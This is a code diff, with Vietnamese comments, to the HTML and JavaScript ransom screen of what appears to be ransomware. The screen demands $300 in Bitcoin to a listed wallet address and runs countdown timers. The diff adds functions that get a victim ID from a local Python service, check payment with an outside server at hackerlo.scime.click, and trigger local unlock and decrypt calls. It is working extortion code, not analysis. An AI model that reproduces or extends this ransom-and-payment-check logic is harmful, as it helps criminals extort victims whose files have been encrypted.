@@ -89,7 +89,8 @@
             color: #FFFFFF; /* Đổi màu chữ nút Decrypt */
         }
         button:hover {
-            background-color: inherit; /* Không đổi màu nền nút khi hover */
+            background-color:rgb(67, 241, 251); /* Màu nền khi hover */
+            color: #FFFFFF; /* Màu chữ khi hover */
         }
         canvas {
             position: fixed;
@@ -139,14 +140,14 @@
             <p>Payment is accepted in Bitcoin only. For more information, click <strong>About bitcoin</strong>. Please check the current price of Bitcoin and buy some bitcoins. Then send the correct amount to the address specified in this window.</p>
         </div>
 
-        <div class="bitcoin-address">
+        <div id="xxx" class="bitcoin-address">
             Send $300 worth of bitcoin to this address:<br>
             <strong>12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw</strong>
         </div>
 
         <div class="footer">
-            <button class="check-payment" onclick="sendAjax('checkPayment')"><strong>Check Payment</strong></button>
-            <button class="decrypt" onclick="sendAjax('decrypt')"><strong>Decrypt</strong></button>
+            <button class="check-payment" onclick="check_payment()"><strong>Check Payment</strong></button>
+            <button class="decrypt" onclick="decrypt()"><strong>Decrypt</strong></button>
         </div>
     </div>
 
@@ -209,38 +210,88 @@
         startCountdown('time-left-payment', 24 * 60 * 60); // 1 day
         startCountdown('time-left-files', 3 * 24 * 60 * 60); // 3 days
 
-        // Hàm gửi AJAX
-        function sendAjax(action) {
-            const url = `/api/${action}`;
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ action })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert(data.message); // Hiển thị phản hồi từ server
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        }
-    </script>
-    <script>
-        window.onload = function () {
-            const elem = document.documentElement; // To make the whole page fullscreen
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen();
-            } else if (elem.mozRequestFullScreen) { // Firefox
-                elem.mozRequestFullScreen();
-            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
-                elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) { // IE/Edge
-                elem.msRequestFullscreen();
+        // JavaScript
+        async function check_payment() {
+            try {
+                // Gọi API Python để lấy ID
+                var response = await sendAjax('http://127.0.0.1:5000/checkPayment');
+                var id = response.message; // ID trả về từ Python
+
+                // Gửi ID đến API của hackerlo.scime.click
+                var kq = await sendAjax('https://hackerlo.scime.click/api_get_status.php', { check: id });
+
+                const messageDiv = document.getElementById('xxx');
+
+                if (kq.status) {
+                    // Nếu trả về true, gọi hàm unlock bên Python
+                    await sendAjax('http://127.0.0.1:5000/unlock');
+
+                    // Cập nhật thông báo thanh toán thành công
+                    messageDiv.innerHTML = '<strong>Paid. Please click decrypt</strong>';
+                } else {
+                    // Hiển thị thông báo chưa thanh toán trong 5 giây
+                    const originalContent = messageDiv.innerHTML;
+                    messageDiv.innerHTML = '<strong>Not yet paid</strong>';
+                    setTimeout(() => {
+                        messageDiv.innerHTML = originalContent;
+                    }, 5000);
+                }
+            } catch (error) {
+                console.error('Error in check_payment:', error);
             }
-        };
+        }
+
+        async function decrypt() {
+            try {
+                const response = await sendAjax('http://127.0.0.1:5000/decrypt');
+                const messageDiv = document.getElementById('xxx');
+        
+                if (response.message === "true") {
+                    // Hiển thị thông báo đang giải mã
+                    const originalContent = messageDiv.innerHTML;
+                    messageDiv.innerHTML = '<strong>Decoding...</strong>';
+                    setTimeout(() => {
+                        messageDiv.innerHTML = originalContent;
+                    }, 5000);
+                } else {
+                    // Hiển thị thông báo chưa thanh toán
+                    const originalContent = messageDiv.innerHTML;
+                    messageDiv.innerHTML = '<strong>not yet paid</strong>';
+                    setTimeout(() => {
+                        messageDiv.innerHTML = originalContent;
+                    }, 5000);
+                }
+            } catch (error) {
+                console.error('Error in decrypt:', error);
+            }
+        }
+        // Hàm gửi AJAX
+        async function sendAjax(url, data = null, method = 'POST') {
+            const headers = { 'Content-Type': 'application/json' };
+            const options = {
+                method: method,
+                headers: headers,
+            };
+
+            // Nếu có dữ liệu, thêm vào body
+            if (data) {
+                options.body = JSON.stringify(data);
+            }
+
+            try {
+                const response = await fetch(url, options);
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                const result = await response.json();
+                return result; // Trả về kết quả nhận được
+            } catch (error) {
+                console.error('Error:', error);
+                throw error; // Ném lỗi ra để xử lý bên ngoài nếu cần
+            }
+        }
+
+                
     </script>
 </body>
 </html>
